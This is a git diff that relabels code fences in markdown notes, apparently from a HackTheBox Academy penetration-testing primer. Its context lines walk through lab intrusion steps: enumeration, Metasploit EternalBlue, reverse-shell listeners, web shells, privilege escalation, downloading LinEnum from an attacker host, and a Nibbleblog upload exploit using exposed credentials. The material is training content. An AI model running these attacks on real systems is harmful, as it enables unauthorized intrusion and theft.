@@ -1,7 +1,7 @@
 # 09. Getting Started
 
 Tags: #🧑‍🎓 
-Related to: [[openvpn]], [[ifconfig]], [[netstat]], [[ssh]], [[ftp]], [[tmux]], [[vi vim]], [[nmap]], [[locate]], [[netcat ncat nc]], [[smbclient]], [[snmpwalk]], [[onesixtyone]], [[gobuster]], [[curl]], [[whatweb]], [[searchsploit]], [[msfconsole]], [[bash]], [[python]], [[peass]], [[wget]], [[scp]], [[base64]], [[md5sum]]
+Related to: [[FTP]], [[base64]], [[bash]], [[curl]], [[gobuster]], [[ifconfig]], [[locate]], [[md5sum]], [[msfconsole]], [[nc]], [[netstat]], [[nmap]], [[onesixtyone]], [[openvpn]], [[peass]], [[python]], [[scp]], [[searchsploit]], [[smbclient]], [[snmpwalk]], [[ssh]], [[tmux]], [[vi vim]], [[wget]], [[whatweb]]
 See also:
 Previous: [[HTB Academy]]
 
@@ -284,7 +284,7 @@ When attacking a single box, lab, or client environment, we should have a clear 
 
 	tree Projects/
 
-```shell-session
+```text
 Projects/
 └── Acme Company
     ├── EPT
@@ -374,7 +374,7 @@ HTB and other services offering purposefully vulnerable VMs/networks require pla
 
 	sudo openvpn user.ovpn
 
-```shell-session
+```text
 Thu Dec 10 18:42:41 2020 OpenVPN 2.4.9 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Apr 21 2020
 Thu Dec 10 18:42:41 2020 library versions: OpenSSL 1.1.1g  21 Apr 2020, LZO 2.10
 Thu Dec 10 18:42:41 2020 Outgoing Control Channel Authentication: Using 256 bit message hash 'SHA256' for HMAC authentication
@@ -392,7 +392,7 @@ Where `sudo` tells our host to run the command as the elevated root user, `op
 
 	ifconfig
 
-```shell-session
+```text
 <SNIP>
 
 tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
@@ -406,7 +406,7 @@ Typing `netstat -rn` will show us the networks accessible via the VPN.
 
 	netstat -rn
 
-```shell-session
+```text
 Kernel IP routing table
 Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
 0.0.0.0         192.168.1.2     0.0.0.0         UG        0 0          0 eth0
@@ -531,7 +531,7 @@ SSH uses a client-server model, connecting a user running an SSH client applicat
 
 	ssh Bob@10.10.10.10
 
-```shell-session
+```text
 Bob@remotehost's password: *********
 
 Bob@remotehost#
@@ -548,7 +548,7 @@ It is also possible to read local private keys on a compromised system or add ou
 
 	netcat 10.10.10.10 22
 
-```shell-session
+```text
 SSH-2.0-OpenSSH_8.4p1 Debian-3
 ```
 
@@ -642,7 +642,7 @@ Let us start with the most basic scan. Suppose that we want to perform a basic s
 
 	nmap 10.129.42.253
 
-```shell-session
+```text
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST
 Nmap scan report for 10.129.42.253
 Host is up (0.11s latency).
@@ -667,7 +667,7 @@ We can use the `-sC` parameter to specify that `Nmap` scripts should be used
 
 	nmap -sV -sC -p- 10.129.42.253
 
-```shell-session
+```text
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:18 EST
 Nmap scan report for 10.129.42.253
 Host is up (0.11s latency).
@@ -732,7 +732,7 @@ Specifying `-sC` will run many useful default scripts against a target, but th
 
 	locate scripts/citrix
 
-```shell-session
+```text
 /usr/share/nmap/scripts/citrix-brute-xml.nse
 /usr/share/nmap/scripts/citrix-enum-apps-xml.nse
 /usr/share/nmap/scripts/citrix-enum-apps.nse
@@ -753,7 +753,7 @@ As previously discussed, banner grabbing is a useful technique to fingerprint a 
 
 	nc -nv 10.129.42.253 21
 
-```shell-session
+```text
 (UNKNOWN) [10.129.42.253] 21 (ftp) open
 220 (vsFTPd 3.0.3)
 ```
@@ -766,7 +766,7 @@ It is worth gaining familiarity with FTP, as it is a standard protocol, and this
 
 	nmap -sC -sV -p21 10.129.42.253
 
-```shell-session
+```text
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 00:54 GMT
 Nmap scan report for 10.129.42.253
 Host is up (0.081s latency).
@@ -798,7 +798,7 @@ Let us connect to the service using the `ftp` command-line utility.
 
 	ftp -p 10.129.42.253
 
-```shell-session
+```text
 Connected to 10.129.42.253.
 220 (vsFTPd 3.0.3)
 Name (10.129.42.253:user): anonymous
@@ -836,7 +836,7 @@ In the above shell, we see that FTP supports common commands such as `cd` and�
 
 	cat login.txt 
 
-```shell-session
+```text
 admin:ftp@dmin123
 ```
 
@@ -848,7 +848,7 @@ SMB (Server Message Block) is a prevalent protocol on Windows machines that prov
 
 	nmap --script smb-os-discovery.nse -p445 10.10.10.40
 
-```shell-session
+```text
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT
 Nmap scan report for doctors.htb (10.10.10.40)
 Host is up (0.022s latency).
@@ -872,7 +872,7 @@ In this case, the host runs a legacy Windows 7 OS, and we could conduct further 
 
 	nmap -A -p445 10.129.42.253
 
-```shell-session
+```text
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST
 Nmap scan report for 10.129.42.253
 Host is up (0.11s latency).
@@ -910,7 +910,7 @@ SMB allows users and administrators to share folders and make them accessible re
 
 	smbclient -N -L \\\\10.129.42.253
 
-```shell-session
+```text
 	Sharename       Type      Comment
 	---------       ----      -------
 	print$          Disk      Printer Drivers
@@ -923,7 +923,7 @@ This reveals the non-default share `users`. Let us attempt to connect as the gu
 
 	smbclient \\\\10.129.42.253\\users
 
-```shell-session
+```text
 Enter WORKGROUP\users's password: 
 Try "help" to get a list of possible commands.
 
@@ -937,7 +937,7 @@ The `ls` command resulted in an access denied message, indicating that guest a
 
 	smbclient -U bob \\\\10.129.42.253\\users
 
-```shell-session
+```text
 Enter WORKGROUP\bob's password: 
 Try "help" to get a list of possible commands.
 
@@ -971,13 +971,13 @@ SNMP Community strings provide information and statistics about a router or devi
 
 	snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
 
-```shell-session
+```text
 iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
 ```
 
 	snmpwalk -v 2c -c private  10.129.42.253 
 
-```shell-session
+```text
 Timeout: No Response from 10.129.42.253
 ```
 
@@ -985,7 +985,7 @@ A tool such as [onesixtyone](https://github.com/trailofbits/onesixtyone) can b
 
 	onesixtyone -c dict.txt 10.129.42.254
 
-```shell-session
+```text
 Scanning 1 hosts, 51 communities
 10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
 ```
@@ -1024,7 +1024,7 @@ GoBuster is a versatile tool that allows for performing DNS, vhost, and director
 
 	gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
 
-```shell-session
+```text
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -1068,7 +1068,7 @@ Next, add a DNS Server such as 1.1.1.1 to the `/etc/resolv.conf` file. We will
 
 	gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
 
-```shell-session
+```text
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -1106,7 +1106,7 @@ In the last section, we discussed banner grabbing for general purposes. Web serv
 
 	curl -IL https://www.inlanefreight.com
 
-```shell-session
+```text
 HTTP/1.1 200 OK
 Date: Fri, 18 Dec 2020 22:24:05 GMT
 Server: Apache/2.4.29 (Ubuntu)
@@ -1123,7 +1123,7 @@ We can extract the version of web servers, supporting frameworks, and applicatio
 
 	whatweb 10.10.10.121
 
-```shell-session
+```text
 http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
 ```
 
@@ -1131,7 +1131,7 @@ http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[licens
 
 	whatweb --no-errors 10.10.10.0/24
 
-```shell-session
+```text
 http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
 http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service]
 http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
@@ -1189,7 +1189,7 @@ Then, we can use `searchsploit` to search for a specific application by its na
 
 	searchsploit openssh 7.2
 
-```shell-session
+```text
 ----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                               |  Path
 ----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -1226,7 +1226,7 @@ Let us take a basic example of searching for an exploit for an application we ar
 
 	msfconsole
 
-```shell-session
+```text
       .:okOOOkdc'           'cdkOOOko:.
     .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
    :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
@@ -1258,7 +1258,7 @@ Once we have `Metasploit` running, we can search for our target application wi
 
 	search exploit eternalblue
 
-```shell-session
+```text
 Matching Modules
 ================
 
@@ -1275,7 +1275,7 @@ We found one exploit for this service. We can use it by copying the full name of
 
 	use exploit/windows/smb/ms17_010_psexec
 
-```shell-session
+```text
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 ```
 
@@ -1283,7 +1283,7 @@ Before we can run the exploit, we need to configure its options. To view the opt
 
 	msf6 > show options
 
-```shell-session
+```text
 Module options (exploit/windows/smb/ms17_010_psexec):
 
    Name                  Current Setting                                                 Required  Description
@@ -1309,13 +1309,13 @@ Any option with `Required` set to `yes` needs to be set for the exploit to w
 
 	set RHOSTS 10.10.10.40
 
-```shell-session
+```text
 RHOSTS => 10.10.10.40
 ```
 
 	set LHOST tun0
 
-```shell-session
+```text
 LHOST => tun0
 ```
 
@@ -1323,7 +1323,7 @@ Once we have both options set, we can start the exploitation. However, before we
 
 	check
 
-```shell-session
+```text
 [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
 [+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
 [*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
@@ -1334,7 +1334,7 @@ As we can see, the server is indeed vulnerable. Note that not every exploit in t
 
 	exploit
 
-```shell-session
+```text
 [*] Started reverse TCP handler on 10.10.14.2:4444 
 [*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
 [*] 10.10.10.40:445 - Built a write-what-where primitive...
@@ -1405,7 +1405,7 @@ The first step is to start a `netcat` listener on a port of our choosing:
 
 	nc -lvnp 1234
 
-```shell-session
+```text
 listening on [any] 1234 ...
 ```
 
@@ -1426,7 +1426,7 @@ However, first, we need to find our system's IP to send a reverse connection bac
 
 	ip a
 
-```shell-session
+```text
 ...SNIP...
 
 3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
@@ -1455,7 +1455,7 @@ We can utilize the exploit we have over the remote host to execute one of the ab
 
 	nc -lvnp 1234
 
-```shell-session
+```text
 listening on [any] 1234 ...
 connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572
 
@@ -1501,7 +1501,7 @@ We can use `netcat` to connect to that port and get a connection to the shell:
 
 	nc 10.10.10.1 1234
 
-```shell-session
+```text
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -1526,7 +1526,7 @@ After we run this command, we will hit `ctrl+z` to background our shell and ge
 	[Enter]
 	[Enter]
 
-```shell-session
+```text
 www-data@remotehost$
 ```
 
@@ -1536,13 +1536,13 @@ We may notice that our shell does not cover the entire terminal. To fix this, we
 
 	echo $TERM
 
-```shell-session
+```text
 xterm-256color
 ```
 
 	stty size
 
-```shell-session
+```text
 67 318
 ```
 
@@ -1603,7 +1603,7 @@ Another option is to use `cURL`:
 
 	curl http://SERVER_IP:PORT/shell.php?cmd=id
 
-```shell-session
+```text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -1639,7 +1639,7 @@ Let us take an example of running the Linux script from `PEASS` called `LinPE
 
 	./linpeas.sh
 
-```shell-session
+```text
 ...SNIP...
 
 Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
@@ -1693,7 +1693,7 @@ The `sudo` command in Linux allows a user to execute commands as a different u
 
 	sudo -l
 
-```shell-session
+```text
 [sudo] password for user1:
 ...SNIP...
 
@@ -1705,7 +1705,7 @@ The above output says that we can run all commands with `sudo`, which gives us 
 
 	sudo su -
 
-```shell-session
+```text
 [sudo] password for user1:
 whoami
 root
@@ -1715,7 +1715,7 @@ The above command requires a password to run any commands with `sudo`. There ar
 
 	sudo -l
 
-```shell-session
+```text
     (user : user) NOPASSWD: /bin/echo
 ```
 
@@ -1723,7 +1723,7 @@ The `NOPASSWD` entry shows that the `/bin/echo` command can be executed with
 
 	sudo -u user /bin/echo Hello World!
 
-```shell-session
+```text
     Hello World!
 ```
 
@@ -1756,7 +1756,7 @@ If we can write to a directory called by a cron job, we can write a bash script 
 
 Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us, as below:
 
-```shell-session
+```text
 ...SNIP...
 [+] Searching passwords in config PHP files
 [+] Finding passwords inside logs (limit 70)
@@ -1768,7 +1768,7 @@ As we can see, the database password '`password123`' is exposed, which would all
 
 	su -
 
-```shell-session
+```text
 Password: password123
 whoami
 
@@ -1788,7 +1788,7 @@ Finally, let us discuss SSH keys. If we have read access over the `.ssh` direc
 	chmod 600 id_rsa
 	ssh user@10.10.10.10 -i id_rsa
 
-```shell-session
+```text
 root@remotehost#
 ```
 
@@ -1798,7 +1798,7 @@ If we find ourselves with write access to a users`/.ssh/` directory, we can pla
 
 	ssh-keygen -f key
 
-```shell-session
+```text
 Generating public/private rsa key pair.
 Enter passphrase (empty for no passphrase): *******
 Enter same passphrase again: *******
@@ -1823,7 +1823,7 @@ Now, the remote server should allow us to log in as that user by using our priva
 
 	ssh root@10.10.10.10 -i key
 
-```shell-session
+```text
 root@remotehost# 
 ```
 
@@ -1851,7 +1851,7 @@ There are many methods to accomplish this. One method is running a [Python HTTP
 	cd /tmp
 	python3 -m http.server 8000
 
-```shell-session
+```text
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
@@ -1859,7 +1859,7 @@ Now that we have set up a listening server on our machine, we can download the f
 
 	wget http://10.10.14.1:8000/linenum.sh
 
-```shell-session
+```text
 ...SNIP...
 Saving to: 'linenum.sh'
 
@@ -1872,7 +1872,7 @@ Note that we used our IP `10.10.14.1` and the port our Python server runs on 
 
 	curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
 
-```shell-session
+```text
 100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
 ```
 
@@ -1885,7 +1885,7 @@ Another method to transfer files would be using `scp`, granted we have obtained
 
 	scp linenum.sh user@remotehost:/tmp/linenum.sh
 
-```shell-session
+```text
 user@remotehost's password: *********
 linenum.sh
 ```
@@ -1901,7 +1901,7 @@ In some cases, we may not be able to transfer the file. For example, the remote 
 
 	base64 shell -w 0
 
-```shell-session
+```text
 f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
 ```
 
@@ -1916,7 +1916,7 @@ To validate the format of a file, we can run the [file](https://linux.die.net/m
 
 	file shell
 
-```shell-session
+```text
 shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
 ```
 
@@ -1924,7 +1924,7 @@ As we can see, when we run the `file` command on the `shell` file, it says t
 
 	md5sum shell
 
-```shell-session
+```text
 321de1d7e7c3735838890a72c9ae7d1d shell
 ```
 
@@ -1932,7 +1932,7 @@ Now, we can go to the remote server and run the same command on the file we tran
 
 	md5sum shell
 
-```shell-session
+```text
 321de1d7e7c3735838890a72c9ae7d1d shell
 ```
 
@@ -2282,7 +2282,7 @@ Let us begin with a quick `nmap` scan to look for open ports using the command
 
 	nmap -v -oG -
 
-```shell-session
+```text
 # Nmap 7.80 scan initiated Wed Dec 16 23:22:26 2020 as: nmap -v -oG -
 
 # Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389) UDP(0;) SCTP(0;) PROTOCOLS(0;)
@@ -2296,7 +2296,7 @@ Finally, we will output all scan formats using `-oA`. This includes XML output,
 
 	nmap -sV --open -oA nibbles_initial_scan 10.129.42.190
 
-```shell-session
+```text
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:18 EST
 
 Nmap scan report for 10.129.42.190
@@ -2316,7 +2316,7 @@ From the initial scan output, we can see that the host is likely Ubuntu Linux an
 
 	ls
 
-```shell-session
+```text
 nibbles_initial_scan.gnmap  nibbles_initial_scan.nmap  nibbles_initial_scan.xml
 ```
 
@@ -2324,7 +2324,7 @@ Before we start poking around at the open ports, we can run a full TCP port scan
 
 	nc -nv 10.129.42.190 22
 
-```shell-session
+```text
 (UNKNOWN) [10.129.42.190] 22 (ssh) open
 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
 ```
@@ -2333,7 +2333,7 @@ SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
 
 	nc -nv 10.129.42.190 80
 
-```shell-session
+```text
 (UNKNOWN) [10.129.42.190] 80 (http) open
 ```
 
@@ -2341,7 +2341,7 @@ Checking our other terminal window, we can see that the full port scan (`-p-`) h
 
 	nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190
 
-```shell-session
+```text
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:39 EST
 Nmap scan report for 10.129.42.190
 Host is up (0.11s latency).
@@ -2362,7 +2362,7 @@ The script scan did not give us anything handy. Let us round out our `nmap` en
 
 	nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 
 
-```shell-session
+```text
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 EST
 Nmap scan report for 10.129.42.190
 Host is up (0.11s latency).
@@ -2389,7 +2389,7 @@ We can use `whatweb` to try to identify the web application in use.
 
 	whatweb 10.129.42.190
 
-```shell-session
+```text
 http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
 ```
 
@@ -2405,7 +2405,7 @@ We can also check this with cURL.
 
 	curl http://10.129.42.190
 
-```shell-session
+```text
 <b>Hello world!</b>
 
 <!-- /nibbleblog/ directory. Nothing interesting here! -->
@@ -2415,7 +2415,7 @@ The HTML comment mentions a directory named `nibbleblog`. Let us check this wit
 
 	whatweb http://10.129.42.190/nibbleblog
 
-```shell-session
+```text
 http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently]
 http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
 ```
@@ -2437,7 +2437,7 @@ Let us use [Gobuster](https://github.com/OJ/gobuster) to be thorough and check
 
 	gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
 
-```shell-session
+```text
 ===============================================================
 
 Gobuster v3.0.1
@@ -2474,7 +2474,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 	curl http://10.129.42.190/nibbleblog/README
 
-```shell-session
+```text
 ====== Nibbleblog ======
 Version: v4.0.3
 Codename: Coffee
@@ -2516,7 +2516,7 @@ Browsing to `nibbleblog/content` shows some interesting subdirectories `publi
 
 	curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
 
-```shell-session
+```text
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <users>
   <user username="admin">
@@ -2549,7 +2549,7 @@ There are no other ports open, and we did not find any other directories. Which 
 
 	gobuster dir -u http://10.129.42.190/ --wordlist /usr/share/dirb/wordlists/common.txt
 
-```shell-session
+```text
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -2577,7 +2577,7 @@ Taking another look through all of the exposed directories, we find a `config.x
 
 	curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
 
-```shell-session
+```text
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <config>
   <name type="string">Nibbles</name>
@@ -2675,7 +2675,7 @@ Save this code to a file and then click on the `Browse` button and upload it.
 
 We get a bunch of errors, but it seems like the file may have uploaded.
 
-```shell-session
+```text
 Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
 
 Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27
@@ -2693,7 +2693,7 @@ Now we have to find out where the file uploaded if it was successful. Going back
 
 	curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
 
-```shell-session
+```text
 uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 ```
 
@@ -2713,7 +2713,7 @@ We upload the file again and start a `netcat` listener in our terminal:
 
 	nc -lvnp 9443
 
-```shell-session
+```text
 listening on [any] 9443 ...
 ```
 
@@ -2721,7 +2721,7 @@ listening on [any] 9443 ...
 
 	nc -lvnp 9443
 
-```shell-session
+```text
 listening on [any] 9443 ...
 connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
 /bin/sh: 0: can't access tty; job control turned off
@@ -2738,13 +2738,13 @@ Try the various techniques for upgrading to a full TTY and pick one that works b
 
 	python -c 'import pty; pty.spawn("/bin/bash")'
 
-```shell-session
+```text
 /bin/sh: 3: python: not found
 ```
 
 	which python3
 
-```shell-session
+```text
 /usr/bin/python3
 ```
 
@@ -2752,7 +2752,7 @@ We have `Python3` though, which works to get us to a friendlier shell by typin
 
 	ls
 
-```shell-session
+```text
 ls
 personal.zip  user.txt
 ```
@@ -2769,7 +2769,7 @@ Now that we have a reverse shell connection, it is time to escalate privileges. 
 
 	unzip personal.zip
 
-```shell-session
+```text
 unzip personal.zip
 Archive:  personal.zip
    creating: personal/
@@ -2781,7 +2781,7 @@ The shell script `monitor.sh` is a monitoring script, and it is owned by our 
 
 	cat monitor.sh
 
-```shell-session
+```text
                  ####################################################################################################
 
                  #                                        Tecmint_monitor.sh                                        #
@@ -2824,7 +2824,7 @@ Let us put this aside for now and pull in [LinEnum.sh](https://raw.githubuserco
 
 	sudo python3 -m http.server 8080
 
-```shell-session
+```text
 [sudo] password for ben: ***********
 
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
@@ -2833,7 +2833,7 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 
 Back on the target type `wget http://<your ip>:8080/LinEnum.sh` to download the script. If successful, we will see a 200 success response on our Python HTTP server. Once the script is pulled over, type `chmod +x LinEnum.sh` to make the script executable and then type `./LinEnum.sh` to run it. We see a ton of interesting output but what immediately catches the eye are `sudo` privileges.
 
-```shell-session
+```text
 [+] We can sudo without supplying a password!
 Matching Defaults entries for nibbler on Nibbles:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -2858,7 +2858,7 @@ Finally, catch the root shell on our waiting `nc` listener.
 
 	nc -lvnp 8443
 
-```shell-session
+```text
 listening on [any] 8443 ...
 connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
 # id
@@ -2880,7 +2880,7 @@ As discussed earlier, there is also a `Metasploit` module that works for this 
 
 	msf6 > search nibbleblog
 
-```shell-session
+```text
 Matching Modules
 ================
 
@@ -2898,7 +2898,7 @@ We can then type `use 0` to load the selected exploit. Set the `rhosts` opti
 
 	use 0
 
-```shell-session
+```text
 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
 
 msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.42.190
@@ -2911,7 +2911,7 @@ Type show options to see what other options need to be set.
 
 	show options 
 
-```shell-session
+```text
 Module options (exploit/multi/http/nibbleblog_file_upload):
 
   Name       Current Setting  Required  Description
@@ -2945,19 +2945,19 @@ We need to set the admin username and password `admin:nibbles` and the `TARGE
